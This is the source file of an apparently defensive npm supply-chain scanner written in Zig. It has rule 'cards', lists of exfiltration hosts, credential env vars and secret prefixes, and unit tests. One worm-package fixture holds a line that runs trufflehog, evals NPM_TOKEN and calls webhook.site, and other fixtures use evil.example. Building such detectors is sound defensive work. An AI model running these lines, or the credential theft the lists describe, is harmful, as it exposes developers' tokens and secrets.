// deck.zig — the deck: every card is a detection rule.
// Static analysis only. No process is spawned, no file is extracted.
const std = @import("std");
const models = @import("models.zig");

const Facts = models.PackageFacts;
const Finding = models.Finding;
const Severity = models.Severity;

// ---- card weights ------------------------------------------------------
fn weightOf(s: Severity) u8 {
    return switch (s) {
        .info => 0,
        .low => 5,
        .medium => 12,
        .high => 30,
        .critical => 60,
    };
}

// ---- small helpers -----------------------------------------------------
fn containsCI(hay: []const u8, needle: []const u8) bool {
    if (needle.len == 0 or hay.len < needle.len) return false;
    var i: usize = 0;
    while (i + needle.len <= hay.len) : (i += 1) {
        var hit = true;
        for (needle, 0..) |c, j| {
            if (std.ascii.toLower(hay[i + j]) != std.ascii.toLower(c)) {
                hit = false;
                break;
            }
        }
        if (hit) return true;
    }
    return false;
}

fn maskedDetail(alloc: std.mem.Allocator, kind: []const u8, tok: []const u8) ![]const u8 {
    const keep: usize = @min(tok.len, 8);
    return std.fmt.allocPrint(alloc, "{s} credential embedded in package ({s}***)", .{ kind, tok[0..keep] });
}

fn isOctet(s: []const u8) bool {
    if (s.len == 0 or s.len > 3) return false;
    for (s) |c| if (!std.ascii.isDigit(c)) return false;
    const v = std.fmt.parseInt(u16, s, 10) catch return false;
    return v <= 255;
}

fn findRawIp(text: []const u8) ?[]const u8 {
    var i: usize = 0;
    while (i < text.len) : (i += 1) {
        if (!std.ascii.isDigit(text[i])) continue;
        var j = i;
        var dots: usize = 0;
        while (j < text.len and (std.ascii.isDigit(text[j]) or text[j] == '.')) : (j += 1) {
            if (text[j] == '.') dots += 1;
        }
        if (dots == 3 and j > i) {
            const cand = text[i..j];
            var it = std.mem.splitScalar(u8, cand, '.');
            var ok = true;
            while (it.next()) |part| {
                if (!isOctet(part)) {
                    ok = false;
                    break;
                }
            }
            if (ok and j - i <= 15) {
                // skip trivial non-routable noise
                if (std.mem.startsWith(u8, cand, "127.") or
                    std.mem.startsWith(u8, cand, "0.0.0.0") or
                    std.mem.startsWith(u8, cand, "255.255.255")) return null;
                return cand;
            }
        }
        i = j;
    }
    return null;
}

fn levenshtein(a: []const u8, b: []const u8) usize {
    if (std.mem.eql(u8, a, b)) return 0;
    if (a.len == 0) return b.len;
    if (b.len == 0) return a.len;
    var prev: [64]usize = undefined;
    var curr: [64]usize = undefined;
    if (b.len >= 64 or a.len >= 64) return 64; // beyond interest
    for (0..b.len + 1) |j| prev[j] = j;
    for (a, 0..) |ca, i| {
        curr[0] = i + 1;
        for (b, 0..) |cb, j| {
            const cost: usize = if (ca == cb) 0 else 1;
            curr[j + 1] = @min(@min(curr[j] + 1, prev[j + 1] + 1), prev[j] + cost);
        }
        @memcpy(prev[0 .. b.len + 1], curr[0 .. b.len + 1]);
    }
    return prev[b.len];
}

fn hasNonAsciiName(name: []const u8) bool {
    for (name) |c| {
        if (c > 127) return true;
    }
    return false;
}

// ---- protected names (typosquat radar) ---------------------------------
const protected = [_][]const u8{
    "react",       "react-dom",  "axios",       "express",    "lodash",
    "request",     "chalk",      "debug",       "typescript", "commander",
    "node-fetch",  "async",      "moment",      "underscore", "bluebird",
    "body-parser", "vue",        "next",        "eslint",     "jest",
    "webpack",     "jquery",     "bootstrap",   "socket.io",  "mongoose",
    "mongodb",     "redis",      "dotenv",      "crossenv",   "node-sass",
    "colors",      "yargs",      "babylon",     "iconv-lite", "left-pad",
    "fsevents",    "http-proxy", "string-width",
};

// ---- webhook / exfil infrastructure ------------------------------------
const exfil_hosts = [_][]const u8{
    "discord.com/api/webhooks",  "discordapp.com/api/webhooks", "webhook.site",
    "api.telegram.org/bot",      "pastebin.com/raw",            "transfer.sh",
    "requestbin",                "oast.fun",                    "interact.sh",
    "burpcollaborator.net",      "ngrok.io",                    "ngrok-free.app",
    "hooks.slack.com/services",  "pipedream.net",               "envy?leave=1",
};

const sensitive_env = [_][]const u8{
    "NPM_TOKEN",           "NODE_AUTH_TOKEN",       "GITHUB_TOKEN",
    "GH_TOKEN",            "AWS_ACCESS_KEY_ID",     "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",   "AZURE_CLIENT_SECRET",   "GOOGLE_APPLICATION_CREDENTIALS",
    "SSH_AUTH_SOCK",       "KEYSTORE_PASSWORD",     "GPG_PASSPHRASE",
};

const secret_prefixes = [_]struct { p: []const u8, k: []const u8 }{
    .{ .p = "ghp_", .k = "GitHub PAT" },
    .{ .p = "github_pat_", .k = "GitHub fine-grained PAT" },
    .{ .p = "gho_", .k = "GitHub OAuth token" },
    .{ .p = "ghu_", .k = "GitHub user token" },
    .{ .p = "sk-ant-", .k = "Anthropic API key" },
    .{ .p = "sk_live_", .k = "Stripe live key" },
    .{ .p = "AKIA", .k = "AWS access key" },
    .{ .p = "AIza", .k = "Google API key" },
    .{ .p = "xoxb-", .k = "Slack bot token" },
    .{ .p = "xoxp-", .k = "Slack user token" },
    .{ .p = "npm_", .k = "npm token" },
};

// ---- deck state ---------------------------------------------------------
pub const Deck = struct {
    alloc: std.mem.Allocator,
    facts: *Facts,
    findings: std.ArrayList(Finding),
    install_paths: std.StringHashMap(bool),

    pub fn init(alloc: std.mem.Allocator, facts: *Facts) Deck {
        return .{
            .alloc = alloc,
            .facts = facts,
            .findings = std.ArrayList(Finding).init(alloc),
            .install_paths = std.StringHashMap(bool).init(alloc),
        };
    }

    fn add(self: *Deck, card: []const u8, sev: Severity, path: []const u8, comptime fmt: []const u8, args: anytype) void {
        const detail = std.fmt.allocPrint(self.alloc, fmt, args) catch return;
        self.findings.append(.{ .card = card, .severity = sev, .detail = detail, .path = path }) catch {};
    }

    // ---- lifecycle scripts ---------------------------------------------
    const Scripts = struct {
        names: std.ArrayList([]const u8),
        values: std.ArrayList([]const u8),
    };

    fn lifecycleScripts(self: *Deck) ?Scripts {
        const raw = self.facts.package_json orelse return null;
        const parsed = std.json.parseFromSliceLeaky(std.json.Value, self.alloc, raw, .{}) catch {
            self.add("the fool", .medium, "package.json", "package.json exists but does not parse as JSON", .{});
            return null;
        };
        if (parsed != .object) return null;
        var out = Scripts{ .names = std.ArrayList([]const u8).init(self.alloc), .values = std.ArrayList([]const u8).init(self.alloc) };
        // package name
        if (parsed.object.get("name")) |n| {
            if (n == .string) self.facts.package_name = n.string;
        }
        const scripts = parsed.object.get("scripts") orelse return out;
        if (scripts != .object) return out;
        const lifecycle = [_][]const u8{ "preinstall", "install", "postinstall", "prepublish", "prepublishOnly", "prepack", "prepare" };
        var it = scripts.object.iterator();
        while (it.next()) |e| {
            const key = e.key_ptr.*;
            const val = e.value_ptr.*;
            if (val != .string) continue;
            for (lifecycle) |lc| {
                if (std.mem.eql(u8, key, lc)) {
                    out.names.append(key) catch break;
                    out.values.append(val.string) catch break;
                    break;
                }
            }
        }
        return out;
    }

    // mark files referenced by lifecycle scripts
    fn markInstallPath(self: *Deck, scripts: *Scripts) void {
        for (scripts.values.items) |v| {
            var it = std.mem.tokenizeAny(u8, v, " \t;|&\"'`(){}[],");
            while (it.next()) |tok_raw| {
                var tok = tok_raw;
                if (std.mem.lastIndexOfScalar(u8, tok, '=')) |i| tok = tok[i + 1 ..];
                const exts = [_][]const u8{ ".js", ".cjs", ".mjs", ".sh" };
                var is_ref = false;
                for (exts) |e| {
                    if (std.mem.endsWith(u8, tok, e)) is_ref = true;
                }
                if (!is_ref) continue;
                // strip possible env prefixes
                const base = std.fs.path.basenamePosix(tok);
                for (self.facts.files.items) |f| {
                    const fb = std.fs.path.basenamePosix(f.path);
                    if (std.mem.eql(u8, fb, base) or std.mem.eql(u8, f.path, tok)) {
                        self.install_paths.put(f.path, true) catch {};
                    }
                }
            }
        }
    }

    // ---- archive structure cards ----------------------------------------
    fn cardArchive(self: *Deck) void {
        if (self.facts.kind == .lockfile) return;
        var traversal = std.ArrayList([]const u8).init(self.alloc);
        var mimic = std.ArrayList([]const u8).init(self.alloc);
        var stray_escaping: usize = 0;
        var stray_plain: usize = 0;
        var workflows: usize = 0;

        for (self.facts.entries.items) |e| {
            // the tower — traversal
            if (std.mem.startsWith(u8, e.name, "/") or
                std.mem.indexOf(u8, e.name, "../") != null or
                std.mem.eql(u8, e.name, "..") or
                std.mem.indexOf(u8, e.name, "\\") != null or
                (e.name.len >= 2 and std.ascii.isAlphabetic(e.name[0]) and e.name[1] == ':'))
            {
                traversal.append(e.name) catch {};
            }
            // the mimic — double extension
            const lower = self.alloc.dupe(u8, e.name) catch continue;
            defer self.alloc.free(lower);
            for (lower) |*c| c.* = std.ascii.toLower(c.*);
            const risky = [_][]const u8{ ".pdf.js", ".pdf.cjs", ".doc.js", ".docx.js", ".xls.js", ".xlsx.js", ".jpg.js", ".png.js", ".txt.js", ".pdf.sh", ".docx.sh" };
            for (risky) |r| {
                if (std.mem.endsWith(u8, lower, r)) {
                    mimic.append(e.name) catch {};
                    break;
                }
            }
            // the stray — symlinks
            if (e.kind == .symlink) {
                if (std.mem.startsWith(u8, e.link_name, "/") or std.mem.indexOf(u8, e.link_name, "..") != null) {
                    stray_escaping += 1;
                } else {
                    stray_plain += 1;
                }
            }
            // workflows inside a package
            if (std.mem.indexOf(u8, e.name, ".github/workflows/") != null) workflows += 1;
        }

        if (traversal.items.len > 0) {
            const shown = @min(traversal.items.len, 3);
            var buf = std.ArrayList(u8).init(self.alloc);
            for (traversal.items[0..shown]) |t| {
                buf.writer().print("{s} ", .{t}) catch {};
            }
            self.add("the tower", .critical, traversal.items[0], "{d} path-traversal entr{s} (zip-slip): {s}", .{ traversal.items.len, if (traversal.items.len == 1) "y" else "ies", buf.items });
        }
        if (mimic.items.len > 0) {
            const shown = @min(mimic.items.len, 3);
            var buf = std.ArrayList(u8).init(self.alloc);
            for (mimic.items[0..shown]) |t| {
                buf.writer().print("{s} ", .{t}) catch {};
            }
            self.add("the mimic", .medium, mimic.items[0], "{d} double-extension entr{s}: {s}", .{ mimic.items.len, if (mimic.items.len == 1) "y" else "ies", buf.items });
        }
        if (stray_escaping > 0) {
            self.add("the stray", .high, "", "{d} symlink{s} pointing outside the package", .{ stray_escaping, if (stray_escaping == 1) "" else "s" });
        } else if (stray_plain > 0) {
            self.add("the stray", .info, "", "{d} symlink{s} inside the package", .{ stray_plain, if (stray_plain == 1) "" else "s" });
        }
        if (workflows > 0) {
            self.add("the plague", .high, ".github/workflows", "package ships CI workflows ({d} file{s}) — normal packages do not", .{ workflows, if (workflows == 1) "" else "s" });
        }
    }

    // ---- content cards ---------------------------------------------------
    fn cardContent(self: *Deck) void {
        for (self.facts.files.items) |f| {
            const in_install = self.install_paths.get(f.path) != null;
            // the puppeteer
            if (std.mem.indexOf(u8, f.bytes, "child_process") != null and
                (std.mem.indexOf(u8, f.bytes, "exec") != null or std.mem.indexOf(u8, f.bytes, "spawn") != null))
            {
                self.add("the puppeteer", if (in_install) .high else .medium, f.path, "child_process execution in {s}", .{if (in_install) "install path" else "package code"});
            }
            // the chain — pipe to shell
            if ((std.mem.indexOf(u8, f.bytes, "curl") != null or std.mem.indexOf(u8, f.bytes, "wget") != null) and
                (std.mem.indexOf(u8, f.bytes, "| sh") != null or std.mem.indexOf(u8, f.bytes, "|sh") != null or
                    std.mem.indexOf(u8, f.bytes, "| bash") != null or std.mem.indexOf(u8, f.bytes, "|bash") != null))
            {
                self.add("the chain", .critical, f.path, "remote code piped straight into a shell", .{});
            }
            // the faceless — decode + execute
            const decodes = [_][]const u8{ "atob(", "Buffer.from(", "base64" };
            var has_decode = false;
            for (decodes) |d| {
                if (std.mem.indexOf(u8, f.bytes, d) != null) has_decode = true;
            }
            const has_eval = std.mem.indexOf(u8, f.bytes, "eval(") != null or
                std.mem.indexOf(u8, f.bytes, "new Function(") != null;
            if (has_decode and has_eval) {
                self.add("the faceless", .critical, f.path, "decoded payload executed via eval/Function in {s}", .{if (in_install) "install path" else "package"});
            } else if (has_eval and in_install) {
                self.add("the faceless", .high, f.path, "eval/Function in install-path code", .{});
            }
            // the veil — obfuscation density
            var xcount: usize = 0;
            var idx: usize = 0;
            while (std.mem.indexOfPos(u8, f.bytes, idx, "\\x")) |p| {
                xcount += 1;
                idx = p + 2;
            }
            const kb = @max(f.bytes.len / 1024, 1);
            if (f.bytes.len > 512 and xcount / kb >= 8) {
                self.add("the veil", .medium, f.path, "heavy \\x-escape obfuscation ({d}/KB)", .{xcount / kb});
            } else if (f.bytes.len > 512) {
                idx = 0;
                var cur_run: usize = 0;
                var maxrun: usize = 0;
                for (f.bytes) |c| {
                    if (std.ascii.isAlphanumeric(c) or c == '+' or c == '/' or c == '=') {
                        cur_run += 1;
                        if (cur_run > maxrun) maxrun = cur_run;
                    } else cur_run = 0;
                }
                if (maxrun >= 256) {
                    self.add("the veil", .medium, f.path, "embedded base64 blob ({d} chars)", .{maxrun});
                }
            }
            // the whisperer — credential env reach
            if (in_install) {
                var hits = std.ArrayList([]const u8).init(self.alloc);
                for (sensitive_env) |env| {
                    if (std.mem.indexOf(u8, f.bytes, env) != null) hits.append(env) catch {};
                }
                if (hits.items.len > 0) {
                    var buf = std.ArrayList(u8).init(self.alloc);
                    for (hits.items[0..@min(hits.items.len, 3)]) |h| {
                        buf.writer().print("{s} ", .{h}) catch {};
                    }
                    self.add("the whisperer", .medium, f.path, "install-path code reads credential env vars: {s}", .{buf.items});
                }
            }
            // the hangman — exfil endpoints
            for (exfil_hosts) |h| {
                if (std.mem.indexOf(u8, f.bytes, h) != null) {
                    self.add("the hangman", .high, f.path, "known exfiltration endpoint: {s}", .{h});
                    break;
                }
            }
            if (findRawIp(f.bytes)) |ip| {
                if (in_install) self.add("the hangman", .medium, f.path, "raw IP literal in install-path code: {s}", .{ip});
            }
            // the key — embedded credentials
            for (secret_prefixes) |sp| {
                var idx2: usize = 0;
                while (std.mem.indexOfPos(u8, f.bytes, idx2, sp.p)) |p| {
                    var end = p + sp.p.len;
                    while (end < f.bytes.len and end - p < 64 and
                        (std.ascii.isAlphanumeric(f.bytes[end]) or f.bytes[end] == '_' or f.bytes[end] == '-')) : (end += 1)
                    {}
                    const tok = f.bytes[p..end];
                    if (tok.len >= sp.p.len + 8) {
                        const masked = maskedDetail(self.alloc, sp.k, tok) catch "";
                        self.add("the key", .critical, f.path, "{s}", .{masked});
                        break;
                    }
                    idx2 = end;
                }
            }
            // the plague — known worm IOCs
            if (containsCI(f.bytes, "shai-hulud")) {
                self.add("the plague", .critical, f.path, "Shai-Hulud worm marker inside package", .{});
            }
            if (in_install and std.mem.indexOf(u8, f.bytes, "trufflehog") != null) {
                self.add("the plague", .high, f.path, "credential-sweeper (trufflehog) invoked from install path", .{});
            }
        }
    }

    // ---- script cards ----------------------------------------------------
    fn cardScripts(self: *Deck) void {
        var scripts = self.lifecycleScripts() orelse return;
        if (scripts.names.items.len > 0) {
            var buf = std.ArrayList(u8).init(self.alloc);
            for (scripts.names.items) |n| {
                buf.writer().print("{s} ", .{n}) catch {};
            }
            self.add("the summoner", .low, "package.json", "lifecycle hook{s} present: {s}", .{ if (scripts.names.items.len == 1) "" else "s", buf.items });
        }
        self.markInstallPath(&scripts);
        for (scripts.values.items, 0..) |v, i| {
            // the chain in the script string itself
            if ((std.mem.indexOf(u8, v, "curl") != null or std.mem.indexOf(u8, v, "wget") != null) and
                (std.mem.indexOf(u8, v, "| sh") != null or std.mem.indexOf(u8, v, "|sh") != null or
                    std.mem.indexOf(u8, v, "| bash") != null or std.mem.indexOf(u8, v, "|bash") != null))
            {
                self.add("the chain", .critical, scripts.names.items[i], "lifecycle script pipes remote content into shell: {s}", .{scripts.names.items[i]});
            }
            if (std.mem.indexOf(u8, v, "npm publish") != null or std.mem.indexOf(u8, v, "npm whoami") != null) {
                self.add("the plague", .high, scripts.names.items[i], "lifecycle script publishes to a registry: {s}", .{scripts.names.items[i]});
            }
            if (std.mem.indexOf(u8, v, "npm config set registry") != null) {
                self.add("the gatekeeper", .high, scripts.names.items[i], "lifecycle script rewrites the npm registry", .{});
            }
        }
    }

    // ---- registry card ---------------------------------------------------
    fn cardRegistry(self: *Deck) void {
        const raw = self.facts.npmrc orelse return;
        var it = std.mem.splitScalar(u8, raw, '\n');
        while (it.next()) |line_raw| {
            const line = std.mem.trim(u8, line_raw, " \t\r");
            if (std.mem.startsWith(u8, line, "registry=")) {
                const url = line["registry=".len..];
                if (url.len > 0 and std.mem.indexOf(u8, url, "registry.npmjs.org") == null) {
                    self.add("the gatekeeper", .critical, ".npmrc", "packaged .npmrc redirects installs to {s}", .{url});
                }
            }
        }
    }

    // ---- name card --------------------------------------------------------
    fn cardName(self: *Deck) void {
        const name = self.facts.package_name;
        if (name.len == 0) return;
        if (hasNonAsciiName(name)) {
            self.add("the impostor", .high, "package.json", "package name contains non-ASCII characters (homoglyph): {s}", .{name});
            return;
        }
        for (protected) |p| {
            if (std.mem.eql(u8, p, name)) return; // exact match is fine
            const d = levenshtein(p, name);
            if (d == 1) {
                self.add("the impostor", .critical, "package.json", "name is one edit away from '{s}': {s}", .{ p, name });
                return;
            } else if (d == 2) {
                self.add("the impostor", .medium, "package.json", "name is two edits away from '{s}': {s}", .{ p, name });
                return;
            }
        }
    }

    // ---- lockfile card -----------------------------------------------------
    fn cardLockfile(self: *Deck) void {
        const raw = self.facts.lockfile orelse return;
        if (self.facts.kind != .lockfile) return;
        const parsed = std.json.parseFromSliceLeaky(std.json.Value, self.alloc, raw, .{}) catch {
            self.add("the fool", .medium, "package-lock.json", "lockfile does not parse as JSON", .{});
            return;
        };
        if (parsed != .object) return;
        const pkgs = parsed.object.get("packages") orelse return;
        if (pkgs != .object) return;
        var http_count: usize = 0;
        var git_count: usize = 0;
        var script_count: usize = 0;
        var typo: usize = 0;
        var it = pkgs.object.iterator();
        while (it.next()) |e| {
            const key = e.key_ptr.*;
            const val = e.value_ptr.*;
            if (val != .object) continue;
            if (val.object.get("resolved")) |r| {
                if (r == .string) {
                    if (std.mem.startsWith(u8, r.string, "http://")) http_count += 1;
                    if (std.mem.startsWith(u8, r.string, "git+")) git_count += 1;
                }
            }
            if (val.object.get("hasInstallScript")) |h| {
                if (h == .bool and h.bool) script_count += 1;
            }
            // typosquat on dependency names
            if (std.mem.lastIndexOf(u8, key, "node_modules/")) |idx| {
                const dep = key[idx + "node_modules/".len ..];
                if (std.mem.indexOfScalar(u8, dep, '/') == null and hasNonAsciiName(dep)) {
                    typo += 1;
                } else if (std.mem.indexOfScalar(u8, dep, '/') == null) {
                    for (protected) |p| {
                        if (std.mem.eql(u8, p, dep)) break;
                        const d = levenshtein(p, dep);
                        if (d == 1) {
                            typo += 1;
                            self.add("the impostor", .high, key, "dependency is one edit away from '{s}': {s}", .{ p, dep });
                            break;
                        }
                    }
                }
            }
        }
        if (http_count > 0) self.add("the wanderer", .medium, "package-lock.json", "{d} resolved over plain http://", .{http_count});
        if (git_count > 0) self.add("the seeker", .info, "package-lock.json", "{d} dependencies pulled from git directly", .{git_count});
        if (script_count > 0) self.add("the summoner", .low, "package-lock.json", "{d} packages declare install scripts", .{script_count});
    }

    // ---- run the whole deck -----------------------------------------------
    pub fn run(self: *Deck) models.Verdict {
        self.cardScripts();
        self.cardContent();
        self.cardArchive();
        self.cardRegistry();
        self.cardName();
        self.cardLockfile();

        var score: usize = 0;
        for (self.findings.items) |f| score += weightOf(f.severity);
        const final: u8 = @intCast(@min(score, 100));
        return .{
            .score = final,
            .band = models.bandFor(final),
            .findings = self.findings,
            .package_name = self.facts.package_name,
            .source = self.facts.source,
            .kind = self.facts.kind,
            .entry_count = self.facts.entry_count,
            .bytes_seen = self.facts.bytes_seen,
            .truncated_files = self.facts.truncated_files,
            .elapsed_ms = 0,
        };
    }
};

pub fn judge(alloc: std.mem.Allocator, facts: *Facts) models.Verdict {
    var deck = Deck.init(alloc, facts);
    return deck.run();
}

// ---- tests ---------------------------------------------------------------
test "levenshtein basics" {
    try std.testing.expectEqual(@as(usize, 0), levenshtein("react", "react"));
    try std.testing.expectEqual(@as(usize, 1), levenshtein("react", "reat"));
    try std.testing.expectEqual(@as(usize, 2), levenshtein("request", "reqeust"));
}

test "containsCI" {
    try std.testing.expect(containsCI("Hello SHAI-HULUD world", "shai-hulud"));
    try std.testing.expect(!containsCI("innocent", "shai-hulud"));
}

test "findRawIp" {
    const t = "fetch('http://192.168.44.12/x')";
    try std.testing.expectEqualStrings("192.168.44.12", findRawIp(t).?);
    try std.testing.expect(findRawIp("no ip here") == null);
    try std.testing.expect(findRawIp("999.1.1.1 not an ip") == null);
}

test "bandFor" {
    try std.testing.expectEqual(models.Band.clean, models.bandFor(5));
    try std.testing.expectEqual(models.Band.critical, models.bandFor(80));
}

test "judge clean package" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .tarball);
    const pj = "{\"name\":\"left-pad-clone\",\"scripts\":{\"build\":\"node-gyp rebuild\"}}";
    facts.package_json = pj;
    const v = judge(a, &facts);
    try std.testing.expectEqual(models.Band.clean, v.band);
}

test "judge worm package" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .tarball);
    facts.package_json = "{\"name\":\"shai-hulud-worker\",\"scripts\":{\"preinstall\":\"node setup.js\"}}";
    const setup = "require('child_process').exec('trufflehog');const p=Buffer.from(process.env.NPM_TOKEN);eval(p);fetch('https://webhook.site/abc')";
    try facts.files.append(.{ .path = "setup.js", .bytes = setup });
    try facts.entries.append(.{ .name = "setup.js", .kind = .file, .size = setup.len });
    try facts.entries.append(.{ .name = ".github/workflows/shai-hulud-workflow.yml", .kind = .file, .size = 10 });
    const v = judge(a, &facts);
    try std.testing.expectEqual(models.Band.critical, v.band);
    var saw_plague = false;
    var saw_hangman = false;
    for (v.findings.items) |f| {
        if (std.mem.eql(u8, f.card, "the plague")) saw_plague = true;
        if (std.mem.eql(u8, f.card, "the hangman")) saw_hangman = true;
    }
    try std.testing.expect(saw_plague);
    try std.testing.expect(saw_hangman);
}

test "judge traversal entries" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .tarball);
    try facts.entries.append(.{ .name = "../.bashrc", .kind = .file });
    try facts.entries.append(.{ .name = "package/index.js", .kind = .file });
    const v = judge(a, &facts);
    try std.testing.expectEqual(models.Band.critical, v.band);
    try std.testing.expect(std.mem.eql(u8, v.findings.items[0].card, "the tower"));
}

test "judge typosquat" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .tarball);
    facts.package_json = "{\"name\":\"reques\"}";
    const v = judge(a, &facts);
    try std.testing.expectEqual(models.Band.critical, v.band);
    try std.testing.expect(std.mem.eql(u8, v.findings.items[0].card, "the impostor"));
}

test "judge npmrc override" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .tarball);
    facts.npmrc = "registry=https://evil.example/\n";
    const v = judge(a, &facts);
    try std.testing.expectEqual(models.Band.critical, v.band);
    try std.testing.expect(std.mem.eql(u8, v.findings.items[0].card, "the gatekeeper"));
}

test "judge lockfile rules" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    var facts = models.PackageFacts.init(a, "test", .lockfile);
    facts.lockfile = "{\"packages\":{\"node_modules/reques\":{\"resolved\":\"http://evil.example/x.tgz\"},\"node_modules/lodash\":{\"resolved\":\"https://registry.npmjs.org/lodash\"}}}";
    const v = judge(a, &facts);
    var saw_wanderer = false;
    var saw_impostor = false;
    for (v.findings.items) |f| {
        if (std.mem.eql(u8, f.card, "the wanderer")) saw_wanderer = true;
        if (std.mem.eql(u8, f.card, "the impostor")) saw_impostor = true;
    }
    try std.testing.expect(saw_wanderer);
    try std.testing.expect(saw_impostor);
}
